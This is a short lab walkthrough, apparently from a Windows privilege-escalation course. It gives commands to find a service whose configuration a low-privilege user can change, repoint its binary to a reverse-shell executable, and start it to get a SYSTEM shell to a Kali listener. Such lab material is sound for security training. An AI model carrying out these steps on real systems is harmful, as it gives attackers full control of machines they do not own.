

1. Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:
```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

> [!NOTE]
> The "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).

2. Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):
```
sc qc daclsvc
```

3. Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:
```
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

4. Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
```
net start daclsvc
```
